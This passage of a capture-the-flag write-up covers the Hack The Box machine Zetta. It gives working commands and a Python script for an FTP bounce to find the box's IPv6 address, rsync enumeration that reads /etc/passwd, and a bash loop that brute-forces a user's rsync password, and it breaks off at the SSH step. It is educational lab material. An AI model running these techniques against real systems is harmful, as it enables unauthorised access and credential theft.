---
title: HTB: Zetta
url: https://0xdf.gitlab.io/2020/02/22/htb-zetta.html
date: 2020-02-22T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-zetta, hackthebox, nmap, ftp-bounce, rfc-2428, ipv6, rsync, credentials, ssh, tudu, syslog, git, postgresql, sqli
---

![Zetta](https://0xdfimages.gitlab.io/img/zetta-cover.png)

Zetta starts off different from the start, using FTP Bounce attacks to identify the IPv6 address of the box, and then finding RSync listening on IPv6 only. I’ll use limited RSync access to get the size of a user’s password, and then brute force it to get access to the roy home directory, where I can write my key to the authorized keys file to get SSH access. I’ll escalate to the postgres user with an SQL injection into Syslog, where the box author cleverly uses Git to show the config but not the most recent password. Finally, I’ll recover the password for root using some logic and the postgres user’s password. In Beyond Root, I’ll look at the authentication for the FTP server that allowed any 32 character user with the username as the password, dig into the RSync config, and look at the bits of the Syslog config that were hidden from me.

## Box Info

| Name | [Zetta](https://hackthebox.com/machines/zetta)  [Zetta](https://hackthebox.com/machines/zetta) [Play on HackTheBox](https://hackthebox.com/machines/zetta) |
| --- | --- |
| Release Date | [31 Aug 2019](https://twitter.com/hackthebox_eu/status/1167009427402240000) |
| Retire Date | 22 Feb 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Zetta |
| Radar Graph | Radar chart for Zetta |
| First Blood User | 02:12:38[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 04:50:56[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [jkr jkr](https://app.hackthebox.com/users/77141) |

## Recon

### nmap

`nmap` shows three open TCP ports, FTP (21), SSH (22), and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.156
Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-31 14:57 EDT
Nmap scan report for 10.10.10.156
Host is up (0.22s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
root@kali# nmap -p21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.156                                                                                                                  
Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-31 14:57 EDT
Nmap scan report for 10.10.10.156
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp open  http    nginx
|_http-title: Ze::a Share
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.20 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.156                                                                                                                
Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-31 15:16 EDT
Nmap scan report for 10.10.10.156
Host is up (0.20s latency).
All 65535 scanned ports on 10.10.10.156 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds

```

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server), this looks like a Debian 10 buster OS.

### Website - TCP 80

The site is for a file sharing site currently centered on FTP:

[![main site](https://0xdfimages.gitlab.io/img/1567321354117.png)](https://0xdfimages.gitlab.io/img/1567321354117.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/1567321354117.png)

Right in the middle of the page, I find FTP creds:

![1567326671440](https://0xdfimages.gitlab.io/img/1567326671440.png)

But looking at the source, they are just 32 random characters:

```

<script>
function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
var rString = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
</script>
...[snip]...
<div class="media-body fade-up">
    <h3 class="media-heading">Username</h3>
    <p><script>document.write(rString)</script></p>
</div>
...[snip]...
<div class="media-body fade-up">
    <h3 class="media-heading">Password</h3>
    <p><script>document.write(rString)</script></p>
</div>

```

There are some other good clues on the page too:
- The site is called “ZE::A Share”. `::` is a nod towards IPv6.
- In “Stuff We Do”, it mentions FTP with FXP and RFC-2428:

  ![1567356422416](https://0xdfimages.gitlab.io/img/1567356422416.png)

</picture>

I’ll get more about those in the FTP section.
- Looking at the “Our Store” section, they offer FTP and mention “Dual-Stack” is “almost there”:

  ![1567326618170](https://0xdfimages.gitlab.io/img/1567326618170.png)

</picture>
This is another nod to IPv6.

### FTP - TCP 21

#### Enumeration

FTP does not allow anonymous login, but given the information from the webpage, I find I can log in with any 32 character string as both the username and password (they must be the same).

```

root@kali# ftp 10.10.10.156
Connected to 10.10.10.156.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 500 allowed.
220-Local time is now 04:33. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.10.10.156:root): bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
331 User bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb OK. Password required
Password:
230-This server supports FXP transfers
230-OK. Current restricted directory is /
230-0 files used (0%) - authorized: 10 files
230 0 Kbytes used (0%) - authorized: 1024 Kb
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

There’s nothing there:

```

ftp> ls -la
200 PORT command successful
150 Connecting to port 44053
drwxr-xr-x    2 65534      nogroup          4096 Sep  1 03:36 .
drwxr-xr-x    2 65534      nogroup          4096 Sep  1 03:36 ..
-rw-------    1 65534      nogroup             0 Sep  1 03:36 .ftpquota
226-Options: -a -l 
226 3 matches total

```

#### FTP Bounce

There is an interesting note that was easy to miss in the connection message:

```

230-This server supports FXP transfers

```

This confirms the message about FPX from the webpage. FXP transfers allow a user to transfer data through one FTP server onto another. This allows me to use a [Bounce Attack](https://www.linux.org/threads/nmap-ftp-bounce-attack.4493/). If I can instruct this FTP server to connect to other servers and other ports, I can use it as a proxy to scan from the position of Zetta.

There’s two ways to employ this for Zetta, one of them effective.

#### Port Scanning

In theory I can also port scan through the bounce attack. `nmap` has bounce built in, using `-b` to pass the credentials and server to bounce through.

Unfortunately, the ftp connection is very slow to initiate (presumably intentionally on the part of the author), which makes scanning really slow and unreliable. For example, I will learn in a minute that port 8730 is open to IPv6 and on IPv4 to localhost. Here’s a scan of a range that includes that port:

```

root@kali# nmap -Pn -p8725-8735 -b dddddddddddddddddddddddddddddddd:dddddddddddddddddddddddddddddddd@10.10.10.156 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-01 04:51 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up.

PORT     STATE    SERVICE
8725/tcp closed   unknown
8726/tcp closed   unknown
8727/tcp closed   unknown
8728/tcp closed   unknown
8729/tcp closed   unknown
8730/tcp filtered unknown
8731/tcp closed   unknown
8732/tcp closed   dtp-net
8733/tcp closed   ibus
8734/tcp closed   unknown
8735/tcp closed   unknown

Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds

```

The port does show filtered, which is interesting. But it also took 22 seconds to do 11 ports. The slowness makes this somewhat unpractical, especially when there’s another direction to go.

#### Learn Zetta IPv6

First, I noticed all the hints towards IPv6 earlier, but I don’t have a way to scan Zetta on IPv6 without knowing it’s IPv6 address. I can bounce back to myself on IPv6 and see the address that connects.

I’ll need to know my IPv6 address:

```

root@kali# ip addr show dev tun0
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none 
    inet 10.10.14.5/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1003/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::fb67:c55a:83d8:dcc1/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever

```

I’ll connect to Zetta on FTP using `nc`:

```

root@kali# nc 10.10.10.156 21
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 2 of 500 allowed.
220-Local time is now 03:36. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
USER bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
331 User bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb OK. Password required
PASS bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
230-This server supports FXP transfers
230-OK. Current restricted directory is /
230-0 files used (0%) - authorized: 10 files
230 0 Kbytes used (0%) - authorized: 1024 Kb

```

Now I’ll enter a `EPRT` command to tell the server where to connect using the [RFC-2428 syntax](https://tools.ietf.org/html/rfc2428) and my global IPv6:

```

EPRT |2|dead:beef:2::1003|443
501 Sorry, but I won't connect to ports < 1024
EPRT |2|dead:beef:2::1003|2222
200-FXP transfer: from 10.10.14.5 to dead:beef:2::1003%144
200 PORT command successful

```

It’s worth noting that this server won’t connect to ports under 1024. So I pick a high one. Now I’ll start a `nc` listener on 4433 and run `LIST`. It fails on the FTP server:

```

LIST
150 Connecting to port 4433
226-Options: -l 
226 0 matches total

```

But I get a connection at `nc`:

```

root@kali# nc -lnvp 4433
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4433
Ncat: Listening on 0.0.0.0:4433
Ncat: Connection from dead:beef::250:56ff:fe88:e5fa.
Ncat: Connection from dead:beef::250:56ff:fe88:e5fa:54680.

```

Now I have the IPv6 of Zetta. Each time the box boots, that IP will change, so I wrote a quick script to fetch it. The script opens a socket on a random port to listen, then logs into FTP, authenticates, and sets the transfer to my IPv6 with the same random port. Then it accepts the connection on the listener, and prints the IPv6:

```

#!/usr/bin/env python3

import random
import netifaces
import socket

port = random.randint(2000,10000)
print(f'[*] Generated random listen port: {port}')

print(f'[*] Starting listener on ::{port}')
v6listener = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
v6listener.bind(('::', port))
v6listener.listen()

myv6 = netifaces.ifaddresses('tun0')[10][0]['addr']
print(f'[*] Local IPv6 address: {myv6}')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print('[*] Connecting to Zetta 10.10.10.156:21')
    s.connect(('10.10.10.156', 21))
    print('[+] Connected\n[*] Waiting 10 seconds for FTP MOTD')
    s.send(b'\n')
    s.recv(2048)
    print('[*] Logging in')
    s.send(f'USER {"A"*32}\n'.encode())
    s.recv(2048)
    s.send(f'PASS {"A"*32}\n'.encode())
    s.recv(2048)
    eprt_str = f'EPRT |2|{myv6}|{port}'
    print(f'[+] Authenticated\n[*] Sending {eprt_str}')
    s.send(f'{eprt_str}\nLIST\n'.encode())
    s.recv(2048)
    conn, addr = v6listener.accept()
    s.recv(2048)
v6listener.close()
conn.close()
print(f'[+] Got IPv6 for Zetta:\n{addr[0]}')

```

Script will return the IPv6:

```

root@kali# ./get_ipv6.py 
[*] Generated random listen port: 4686
[*] Starting listener on ::4686
[*] Local IPv6 address: dead:beef:2::1009
[*] Connecting to Zetta 10.10.10.156:21
[+] Connected
[*] Waiting 10 seconds for FTP MOTD
[*] Logging in
[+] Authenticated
[*] Sending EPRT |2|dead:beef:2::1009|4686
[+] Got IPv6 for Zetta:
dead:beef::250:56ff:feb9:7e7c

```

### Alternative Path to IPv6

An alternative path to finding Zetta’s IPv6 address is to jump over to another box in the same network (any HTB target). I happen to have a SSH key for root on DevOops handy, so I’ll jump on there. This only works if someone else in the same lab has one of these two boxes up, since in the latest HTB, all the boxes are powered down unless someone turns them on.

On this freshly spun up box there’s only the gateway router in it’s arp table:

```

root@gitter:~# ip neigh
10.10.10.2 dev ens33 lladdr 00:50:56:b0:58:fc REACHABLE
fe80::250:56ff:feb0:58fc dev ens33 lladdr 00:50:56:b0:58:fc router STALE

```

If I ping Zetta, then it’s IPv4 will show up, along with it’s MAC address:

```

root@gitter:~# ping -c 1 10.10.10.156
PING 10.10.10.156 (10.10.10.156) 56(84) bytes of data.
64 bytes from 10.10.10.156: icmp_seq=1 ttl=64 time=0.635 ms
--- 10.10.10.156 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
root@gitter:~# ip neigh
10.10.10.156 dev ens33 lladdr 00:50:56:88:e5:fa REACHABLE
10.10.10.2 dev ens33 lladdr 00:50:56:b0:58:fc REACHABLE
fe80::250:56ff:feb0:58fc dev ens33 lladdr 00:50:56:b0:58:fc router STALE

```

I can [calculate the IPv6 from this MAC](https://ben.akrin.com/?p=1347).
1. Put `ff:fe` into the middle: `00:50:56:ff:fe:88:e5:fa`
2. Reformat to IPv6: `0050:56ff:fe88:e5fa`
3. Flip the second lowest bit in the first octet: `0250:56ff:fe88:e5fa`
4. I can add the link-local prefix to talk from DevOops: `fe80::0250:56ff:fe88:e5fa`
   I can also add the HTB global prefix to communicate from my host: `dead:beef::0250:56ff:fe88:e5fa`

I can ping using the link local from DevOops:

```

root@gitter:~# ping6 -c 3 -I ens33 fe80::0250:56ff:fe88:e5fa
PING fe80::0250:56ff:fe88:e5fa(fe80::250:56ff:fe88:e5fa) from fe80::250:56ff:fe88:2554 ens33: 56 data bytes
64 bytes from fe80::250:56ff:fe88:e5fa: icmp_seq=1 ttl=64 time=0.307 ms
64 bytes from fe80::250:56ff:fe88:e5fa: icmp_seq=2 ttl=64 time=0.330 ms
64 bytes from fe80::250:56ff:fe88:e5fa: icmp_seq=3 ttl=64 time=0.264 ms
--- fe80::0250:56ff:fe88:e5fa ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2026ms
rtt min/avg/max/mdev = 0.264/0.300/0.330/0.030 ms

```

I can use the global address from my workstation:

```

root@kali# ping6 -c 3 -I tun0 dead:beef::0250:56ff:fe88:e5fa
PING dead:beef::0250:56ff:fe88:e5fa(dead:beef::250:56ff:fe88:e5fa) from dead:beef:2::1003 tun0: 56 data bytes
64 bytes from dead:beef::250:56ff:fe88:e5fa: icmp_seq=1 ttl=63 time=22.6 ms
64 bytes from dead:beef::250:56ff:fe88:e5fa: icmp_seq=2 ttl=63 time=26.8 ms
64 bytes from dead:beef::250:56ff:fe88:e5fa: icmp_seq=3 ttl=63 time=46.0 ms
--- dead:beef::0250:56ff:fe88:e5fa ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 22.568/31.803/46.023/10.203 ms

```

### IPv6 nmap

With this address, I’ll rescan with `nmap`:

```

root@kali# nmap -6 -p- --min-rate 10000 -oA scans/nmap-alltcp-ipv6 dead:beef::0250:56ff:fe88:e5fa
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-01 05:49 EDT
Nmap scan report for dead:beef::250:56ff:fe88:e5fa
Host is up (0.20s latency).
Not shown: 50102 filtered ports, 15429 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8730/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 69.42 seconds

root@kali# nmap -6 -sC -sV -p 21,22,80,8730 -oA scans/nmap-tcpscripts-ipv6 dead:beef::0250:56ff:fe88:e5fa
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-01 05:53 EDT
Nmap scan report for dead:beef::250:56ff:fe88:e5fa
Host is up (0.029s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Pure-FTPd
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp   open  http    nginx
|_http-title: Ze::a Share
8730/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:88:e5:fa
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.24 seconds

```

Nothing really new on 21, 22, or 80. But I’ve found Rsync running on 8730.

### Rsync - TCP 8730

I can use `rsycn` to enumerate this service. First I’ll lost the available modules:

```

root@kali# rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

You must have explicit, authorized permission to access this rsync
server. Unauthorized attempts and actions to access or use this 
system may result in civil and/or criminal penalties. 

All activities performed on this device are logged and monitored.
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

@ZE::A staff

This rsync server is solely for access to the zetta master server.
The modules you see are either provided for "Backup access" or for
"Cloud sync".

bin             Backup access to /bin
boot            Backup access to /boot
lib             Backup access to /lib
lib64           Backup access to /lib64
opt             Backup access to /opt
sbin            Backup access to /sbin
srv             Backup access to /srv
usr             Backup access to /usr
var             Backup access to /var

```

I was unable to get any of them to connect without credentials. For example:

```

root@kali# rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/var/
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

You must have explicit, authorized permission to access this rsync
server. Unauthorized attempts and actions to access or use this 
system may result in civil and/or criminal penalties. 

All activities performed on this device are logged and monitored.
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

@ZE::A staff

This rsync server is solely for access to the zetta master server.
The modules you see are either provided for "Backup access" or for
"Cloud sync".

@ERROR: access denied to var from UNDETERMINED (dead:beef:2::1003)
rsync error: error starting client-server protocol (code 5) at main.c(1675) [Receiver=3.1.3]

```

I can check them all with a loop:

```

root@kali# rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/ | grep "Backup access to" | cut -d' ' -f1 | while read dir; do rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/${dir}/ 2>&1 | grep -q "access denied" && echo "[-] ${dir}: denied" || echo "[+] ${dir}: ACCESS GRANTED"; done
[-] bin: denied
[-] boot: denied
[-] lib: denied
[-] lib64: denied
[-] opt: denied
[-] sbin: denied
[-] srv: denied
[-] usr: denied
[-] var: denied

```

That loop breaks down as:
- `rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/` - List the modes
- `grep "Backup access to"` - isolate the lines with the paths
- `cut -d' ' -f1` - isolate the paths
- `while read dir; do` - loop over the paths
- `rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/${dir}/ 2>&1` - try to list that path, forwarding stderr to stdout
- `grep -q "access denied"` - `grep` without printing anything, just succeeding or failing
- `&& echo "[-] ${dir}: denied" || echo "[+] ${dir}: ACCESS GRANTED";` - print message based on `grep` return code.

I did notice that the message of the day says that there are modules for “Backup access” and “Cloud Sync”, but only “Backup access: ones show up. Eventually, I tried other directories typically found at the system root. `/home/` failed, but `/etc/` worked:

```

root@kali# rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/etc/                                                                                                          
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

You must have explicit, authorized permission to access this rsync
server. Unauthorized attempts and actions to access or use this
system may result in civil and/or criminal penalties.

All activities performed on this device are logged and monitored.
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

@ZE::A staff

This rsync server is solely for access to the zetta master server.
The modules you see are either provided for "Backup access" or for
"Cloud sync".

drwxr-xr-x          4,096 2019/08/31 15:56:06 .
-rw-r--r--          2,981 2019/07/27 03:01:29 adduser.conf
-rw-r--r--             44 2019/07/27 03:03:30 adjtime
-rw-r--r--          1,994 2019/04/18 00:12:36 bash.bashrc
-rw-r--r--            367 2018/03/02 15:03:58 bindresvport.blacklist
-rw-r--r--          5,713 2019/07/27 03:07:27 ca-certificates.conf
-rw-r--r--          1,042 2019/06/23 13:49:01 crontab
-rw-r--r--          2,969 2019/02/26 04:30:35 debconf.conf
-rw-r--r--              5 2019/04/19 07:00:00 debian_version
-rw-r--r--            604 2016/06/26 16:00:56 deluser.conf
-rw-r--r--            346 2018/01/14 16:27:01 discover-modprobe.conf
...[snip]...

```

I can get the `/etc/passwd` file:

```

root@kali# rsync -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/etc/passwd
root@kali# cat passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
roy:x:1000:1000:roy,,,:/home/roy:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

```

roy is the most interesting account.

I’ll also look at the rsync related files:

```

root@kali# rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/etc/rsync*                                 
-rw-r--r--          2,929 2019/08/31 15:56:06 rsyncd.conf
-rw-r--r--            558 2019/07/27 06:39:04 rsyncd.motd
-r--------             13 2019/07/27 06:43:25 rsyncd.secrets

```

I don’t have access to the `rsyncd.secrets` file, but I can pull the other two. The motd file is just the message I’ve seen over and over. The `.conf` has lots of good stuff:

```

reverse lookup = no
# GLOBAL OPTIONS

# Change port so that we won't be in shodan
port = 8730 
use chroot = yes
lock file = /var/lock/rsyncd
motd file = /etc/rsyncd.motd
strict modes = yes
ignore errors = no
ignore nonreadable = yes
transfer logging = no
log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.
dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
read only = yes
uid = backup
gid = backup

# MODULE OPTIONS

# Allow backup server to backup /bin
[bin]
        comment = Backup access to /bin
        path = /bin
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /boot
[boot]
        comment = Backup access to /boot
        path = /boot
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# *** WORK IN PROGRESS *** 
# Allow access to /etc to sync configuration files throughout the complete
# cloud server farm. IP addresses from https://ip-ranges.amazonaws.com/ip-ranges.json
#
[etc]
        comment = Backup access to /etc. Also used for cloud sync access.
        path = /etc
        # Do not leak .git repos onto the not so trusted slave servers in the cloud.
        exclude = .git
        # Temporarily disabled access to /etc for security reasons, the networks are
        # have been found to access the share! Only allow 127.0.0.1, deny 0.0.0.0/0!
        #hosts allow = 104.24.0.54 13.248.97.0/24 52.94.69.0/24 52.219.72.0/22
        hosts allow = 127.0.0.1/32
        hosts deny = 0.0.0.0/0
        # Hiding it for now.
        list = false

# Allow backup server to backup /lib
[lib]
        comment = Backup access to /lib
        path = /lib
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /lib64
[lib64]
        comment = Backup access to /lib64
        path = /lib64
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /opt
[opt]
        comment = Backup access to /opt
        path = /opt
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /sbin
[sbin]
        comment = Backup access to /sbin
        path = /sbin
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /srv
[srv]
        comment = Backup access to /srv
        path = /srv
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /usr
[usr]
        comment = Backup access to /usr
        path = /usr
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /var
[var]
        comment = Backup access to /var
        path = /var
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Syncable home directory for .dot file sync for me.
# NOTE: Need to get this into GitHub repository and use git for sync.
[home_roy]
        path = /home/roy
        read only = no
        # Authenticate user for security reasons.
        uid = roy
        gid = roy
        auth users = roy
        secrets file = /etc/rsyncd.secrets
        # Hide home module so that no one tries to access it.
        list = false

```

Major take-aways:
- `read only = yes` - I won’t be able to write here
- The user and group of the process is backup.
- All of the modules I listed earlier have a config that look like:

  ```

  # Allow backup server to backup /bin
  [bin]
          comment = Backup access to /bin
          path = /bin
          # Allow access from backup server only.
          hosts allow = 104.24.0.54

  ```

  They are whitelisted to this Amazon IP, which is why I couldn’t connect.
- There are two additional modules in the config, `etc` and `home_roy`, both of which have `list = false`, which explain why I didn’t see them earlier. I’ll look at `etc` and why I was able to connect over IPv6 in [Beyond Root](#rsync-config).

`home_roy` links to `/home/roy`. It is not read only. When I authenticate, it will be as user roy. And it defines a secrets file, `/etc/rsyncd.secrets`. That’s the file I noticed earlier but couldn’t read.

## Shell as roy

### Brute Force Password

If I try to connect to `home_roy`, it prompts for a password:

```

root@kali# rsync rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy
...[snip]...
Password: 
@ERROR: auth failed on module home_roy
rsync error: error starting client-server protocol (code 5) at main.c(1675) [Receiver=3.1.3]

```

I can’t see the `rsyncd.secrets` file, but I know it is 13 bytes in length from above. That’s likely `roy:` + 8 character password + a new line.

I’ll create a wordlist of 8 byte words from [SecList’s](https://github.com/danielmiessler/SecLists) `10-million-password-list-top-100000.txt`

```

root@kali# grep -E '^.{8}$' /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt > 10-million-password-list-top-100000-8char.txt
root@kali# ls -l 10-million-password-list-top-100000-8char.txt 
-rwxrwx--- 1 root vboxsf 307611 Sep  1 07:20 10-million-password-list-top-100000-8char.txt

```

I can connect to `rsync` without providing a password using the `RSYNC_PASSWORD` environment variable. If I set it to “password”, the connection still fails, but without prompting for a password:

```

root@kali# export RSYNC_PASSWORD=password
root@kali# rsync --list-only rsync://roy@[dead:beef::250:56ff:feb9:7e7c]:8730/home_roy
...[snip]...
@ERROR: auth failed on module home_roy
rsync error: error starting client-server protocol (code 5) at main.c(1675) [Receiver=3.1.3]

```

Now I can loop over my wordlist, setting the environment variable, and try to log in with a `bash` one-liner:

```

root@kali# cat 10-million-password-list-top-100000-8char.txt | while read pass; do export RSYNC_PASSWORD=${pass}; rsync --list-only rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy 2>&1 | grep -q "auth failed on module home_roy" || { echo "[+] Found password: ${RSYNC_PASSWORD}"; break; } done
[+] Found password: computer

```

Breaking that down:
- Dumps the password list into a `while read` loop.
- For each password, it saves it to the environment variable with `export.
- It then tries to `rsync`, piping the results (both stdout and stderr) into a `grep`.
- The `grep` will match on “auth failed on module home\_roy”, and return true if matched.
- `||` is an or, so if the previous command (`grep`) failed (doesn’t find that failure note), it will run the commands between the `{ }`.
- In this case, that means print the password, and then exit the loop.

### Copy Files

Now with roy’s password, I can access that home directory:

```

root@kali# rsync --list-only rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy 
...[snip]...
drwxr-xr-x          4,096 2019/07/28 06:52:29 .
lrwxrwxrwx              9 2019/07/27 06:57:06 .bash_history
-rw-r--r--            220 2019/07/27 03:03:28 .bash_logout
-rw-r--r--          3,526 2019/07/27 03:03:28 .bashrc
-rw-r--r--            807 2019/07/27 03:03:28 .profile
-rw-------          4,752 2019/07/27 05:24:24 .tudu.xml
-r--r--r--             33 2019/07/27 05:24:24 user.txt

```

I can copy the files to my host:

```

root@kali# rsync -a rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy/ .
...[snip]...
rsync: symlink "/media/sf_CTFs/hackthebox/zetta-10.10.10.156/rsync/.bash_history" -> "/dev/null" failed: Operation not permitted (1)
rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1677) [generator=3.1.3]

```

I can’t get `.bash_history` because it’s linked to `/dev/null`, but I can get everything else, including `user.txt`:

```

root@kali# cat user.txt
a575bdb3************************

```

### SSH as roy

